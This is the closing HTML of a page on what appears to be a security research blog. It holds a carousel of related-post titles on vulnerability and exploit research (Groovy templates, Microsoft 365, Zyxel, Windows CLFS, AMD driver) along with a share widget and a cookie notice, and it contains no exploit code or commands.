</div></div></div></div></div></div></div></div></div><div data-parent="true" class="vc_row has-bg need-focus style-color-lxmt-bg row-container" id="row-unique-3"><div class="row double-top-padding double-bottom-padding single-h-padding full-width row-parent" data-imgready="true"><div class="wpb_row row-inner"><div class="wpb_column pos-top pos-center align_center column_parent col-lg-12 single-internal-gutter"><div class="uncol style-light"><div class="uncoltable"><div class="uncell no-block-padding"><div class="uncont"><div class="owl-carousel-wrapper">
													<div class="owl-carousel-container single-gutter test-init">												<div id="index-177493092" class="owl-carousel owl-element owl-height-equal owl-dots-outside owl-dots-single-block-padding owl-dots-align-center owl-loaded owl-drag showControls" data-dots="true" data-dotsmobile="true" data-navmobile="false" data-navspeed="400" data-autoplay="false" data-stagepadding="0" data-lg="5" data-md="3" data-sm="1" data-vp-height="false"><div class="owl-stage-outer"><div class="owl-stage" style="transform: translate3d(0px, 0px, 0px); transition: all; width: 3456px;"><div class="owl-item active index-active" data-index="1" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-91 tmb-id-5100 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/?media_link=1" class="pushed" aria-label="Groovy logo" target="_self" data-lb-index="0"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159919 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/GROOVY.jpg" width="1600" height="836" alt="Groovy logo" data-no-bp="" data-bp="720" data-uniqueid="159919-185017" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/GROOVY.jpg" data-path="2025/09/GROOVY.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-91 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/articles/">Articles</a></span></p><p class="t-entry-meta"><span class="t-entry-date">November 11, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/groovy-template-engine-exploitation-part-2/" target="_self">Groovy Template Engine Exploitation – Notes from a real case scenario, part 2</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item active index-active" data-index="2" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-81 tmb-id-159840 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/export-to-pdf-allows-local-file-inclusion-path-traversal-in-microsoft-365/?media_link=1" class="pushed" aria-label="Microsoft 365 logo" target="_self" data-lb-index="1"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159937 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/MIC-365.jpg" width="1600" height="836" alt="Microsoft 365 logo" data-no-bp="" data-bp="720" data-uniqueid="159937-545365" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/MIC-365.jpg" data-path="2025/09/MIC-365.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">July 8, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/export-to-pdf-allows-local-file-inclusion-path-traversal-in-microsoft-365/" target="_self">Export to PDF allows local file inclusion/path traversal in Microsoft 365</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item active index-active" data-index="3" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-76 grid-cat-81 grid-cat-91 tmb-id-5512 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/?media_link=1" class="pushed" aria-label="ZeroDay logo" target="_self" data-lb-index="2"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159967 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/ZERODAY.jpg" width="1600" height="836" alt="ZeroDay logo" data-no-bp="" data-bp="720" data-uniqueid="159967-171813" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/ZERODAY.jpg" data-path="2025/09/ZERODAY.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-76 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/events/">Events</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span><span class="t-entry-category t-entry-category-91 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/articles/">Articles</a></span></p><p class="t-entry-meta"><span class="t-entry-date">May 6, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/my-zero-day-quest-bluehat-podcast/" target="_self">My Zero Day Quest &amp; BlueHat Podcast</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.0012px);"></div></div></div>
							</div></div></div></div><div class="owl-item active index-active" data-index="4" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-81 tmb-id-5313 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731/?media_link=1" class="pushed" aria-label="Zyxel Networks logo" target="_self" data-lb-index="3"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159969 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/ZYXEL.jpg" width="1600" height="836" alt="Zyxel Networks logo" data-no-bp="" data-bp="720" data-uniqueid="159969-115142" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/ZYXEL.jpg" data-path="2025/09/ZYXEL.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">April 23, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/local-privilege-escalation-on-zyxel-usg-flex-h-series-cve-2025-1731/" target="_self">Local privilege escalation on Zyxel USG FLEX H Series (CVE-2025-1731)</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item active index-active" data-index="5" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-81 tmb-id-5027 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-2/?media_link=1" class="pushed" aria-label="Microsoft logo" target="_self" data-lb-index="4"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159961 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg" width="1600" height="836" alt="Microsoft logo" data-no-bp="" data-bp="720" data-uniqueid="159961-161797" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg" data-path="2025/09/WIN.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">January 29, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-2/" target="_self">CVE-2024-49138 Windows CLFS heap-based buffer overflow analysis – Part 2</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item" data-index="6" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-81 tmb-id-4929 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/?media_link=1" class="pushed" aria-label="Microsoft logo" target="_self" data-lb-index="5"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159961 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg" width="1600" height="836" alt="Microsoft logo" data-no-bp="" data-bp="720" data-uniqueid="159961-247758" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/WIN.jpg" data-path="2025/09/WIN.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">January 29, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/" target="_self">CVE-2024-49138 Windows CLFS heap-based buffer overflow analysis – Part 1</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item" data-index="7" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-81 tmb-id-4228 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/from-arbitrary-pointer-dereference-to-arbitrary-read-write-in-latest-windows-11/?media_link=1" class="pushed" target="_self" data-lb-index="6"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159895 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg" width="1600" height="836" alt="" data-no-bp="" data-bp="720" data-uniqueid="159895-303699" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg" data-path="2025/09/AMD.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">January 15, 2025</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/from-arbitrary-pointer-dereference-to-arbitrary-read-write-in-latest-windows-11/" target="_self">From arbitrary pointer dereference to arbitrary read/write in latest Windows 11</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item" data-index="8" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-81 grid-cat-91 tmb-id-4341 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/an-analysis-of-the-keycloak-authentication-system/?media_link=1" class="pushed" aria-label="KEYCLOAK logo" target="_self" data-lb-index="7"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159927 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/KEYCLOAK.jpg" width="1600" height="836" alt="KEYCLOAK logo" data-no-bp="" data-bp="720" data-uniqueid="159927-145814" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/KEYCLOAK.jpg" data-path="2025/09/KEYCLOAK.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span><span class="t-entry-category t-entry-category-91 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/articles/">Articles</a></span></p><p class="t-entry-meta"><span class="t-entry-date">October 30, 2024</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/an-analysis-of-the-keycloak-authentication-system/" target="_self">An analysis of the Keycloak authentication system</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div><div class="owl-item" data-index="9" style="width: 384px;"><div class="tmb tmb-carousel atc-typography-inherit tmb-iso-h33 tmb-round img-round-lg tmb-light tmb-text-showed tmb-overlay-anim tmb-content-left  grid-cat-78 grid-cat-81 tmb-id-4100 tmb-content-under tmb-media-first" style="transition-delay: 120ms; transition-duration: 320ms;"><div class="t-inside style-color-xsdn-bg no-anim srcset-lazy-animations"><div class="t-entry-visual"><div class="t-entry-visual-tc"><div class="t-entry-visual-cont"><div class="dummy" style="padding-top: 52.3%;"></div><a role="button" tabindex="-1" href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/?media_link=1" class="pushed" target="_self" data-lb-index="8"><div class="t-entry-visual-overlay"><div class="t-entry-visual-overlay-in style-color-wayh-bg" style="opacity: 0.5;"></div></div><img decoding="async" class="srcset-auto srcset-on-layout wp-image-159895 srcset-sizes-done" src="https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg" width="1600" height="836" alt="" data-no-bp="" data-bp="720" data-uniqueid="159895-174498" data-guid="https://hnsecurity.it/wp-content/uploads/2025/09/AMD.jpg" data-path="2025/09/AMD.jpg" data-width="1600" data-height="836" data-singlew="2" data-singleh="33" data-crop="" loading="lazy"></a></div>
					</div>
				</div><div class="t-entry-text">
									<div class="t-entry-text-tc half-block-padding"><div class="t-entry"><p class="t-entry-meta"><span class="t-entry-category t-entry-category-78 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/exploits/">Exploits</a></span><span class="t-entry-category t-entry-category-81 t-entry-tax"><a class="bordered-cat tmb-term-evidence font-ui" href="https://hnsecurity.it/blog/category/vulnerabilities/">Vulnerabilities</a></span></p><p class="t-entry-meta"><span class="t-entry-date">October 9, 2024</span></p><h3 class="t-entry-title h5 title-scale "><a href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-3/" target="_self">Exploiting AMD atdcm64a.sys arbitrary pointer dereference – Part 3</a></h3><div class="t-entry-excerpt " style="transform: translateY(16.001px);"></div></div></div>
							</div></div></div></div></div></div>					<div class="owl-nav disabled"><button type="button" aria-label="Previous" class="owl-prev style-light style-override" style="margin-left: -16px;"><div class="owl-nav-container btn-default btn-hover-nobg" tabindex="0"><i class="fa fa-fw fa-angle-left"></i></div></button><button type="button" aria-label="Next" class="owl-next style-light style-override" style="margin-right: -16px;"><div class="owl-nav-container btn-default btn-hover-nobg" aria-label="Next" tabindex="0"><i class="fa fa-fw fa-angle-right"></i></div></button></div><div class="owl-dots uncode_index-dot_classes limit-width owl-dots-classes"><button class="owl-dot active" aria-label="Slide 1"><span></span></button><button class="owl-dot" aria-label="Slide 2"><span></span></button></div></div>	
	

	</div>				</div>
</div></div></div></div></div></div></div></div></div><div class="post-footer post-footer-light row-container"><div class="row-container">
		  					<div class="row row-parent style-light no-top-padding double-bottom-padding" style="max-width: 804px; margin: auto;">
									<div class="post-share">
	          						<div class="detail-container margin-auto">
													<div class="share-button share-buttons share-inline only-icon sharer-0" style="display: block;"><label class="social-export"><span></span></label></div>
												</div>
											</div>
								</div>
							</div></div></div>
          </div>
        </article>								</div><!-- sections container -->
							</div><!-- page wrapper -->
												
												<div class="overlay-menu-focus style-dark-bg "></div>					</div><!-- main container -->
				</div><!-- main wrapper -->
							</div><!-- box container -->
					</div><!-- box wrapper -->
		<div class="style-light footer-scroll-top footer-scroll-higher"><a href="https://hnsecurity.it/blog/exploiting-amd-atdcm64a-sys-arbitrary-pointer-dereference-part-2/#" class="scroll-top" aria-label="Scroll to top"><i class="fa fa-angle-up fa-stack btn-default btn-hover-nobg"></i></a></div>
	

































		
		
	
		<!-- Cookie Notice plugin v2.5.12 by Hu-manity.co https://hu-manity.co/ -->
		<div id="cookie-notice" role="dialog" class="cookie-notice-hidden cookie-revoke-hidden cn-position-bottom" aria-label="Cookie Notice" style="background-color: rgba(255,255,255,1);"><div class="cookie-notice-container" style="color: #2d2d2d"><span id="cn-notice-text" class="cn-text-container">We use cookies to improve your browsing experience and analyze our traffic. By clicking "Accept all", you consent to the use of cookies.</span><span id="cn-notice-buttons" class="cn-buttons-container"><button id="cn-accept-cookie" data-cookie-set="accept" class="cn-set-cookie cn-button cn-button-custom custom-link btn btn-cookiebanner border-width-0 btn-accent btn-circle" aria-label="Accept All">Accept All</button><button data-link-url="https://hnsecurity.it/privacy-policy/" data-link-target="_blank" id="cn-more-info" class="cn-more-info cn-button cn-button-custom custom-link btn btn-cookiebanner border-width-0 btn-accent btn-circle" aria-label="Privacy policy">Privacy policy</button></span><button type="button" id="cn-close-notice" data-cookie-set="accept" class="cn-close-icon" aria-label="Reject All"></button></div>
			
		</div>
		<!-- / Cookie Notice plugin -->

</body></html>